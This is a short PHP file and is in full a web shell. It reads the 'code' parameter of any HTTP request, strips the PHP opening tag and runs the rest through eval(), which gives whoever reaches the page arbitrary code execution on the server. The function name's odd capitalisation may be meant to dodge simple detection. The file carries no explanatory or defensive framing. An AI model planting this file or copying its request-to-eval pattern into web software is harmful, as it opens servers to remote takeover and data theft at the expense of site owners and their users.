<?php
function phpevaL(){
	$code = str_replace("<?php","",$_REQUEST['code']);
	eval($code);
}

phpevaL();
?>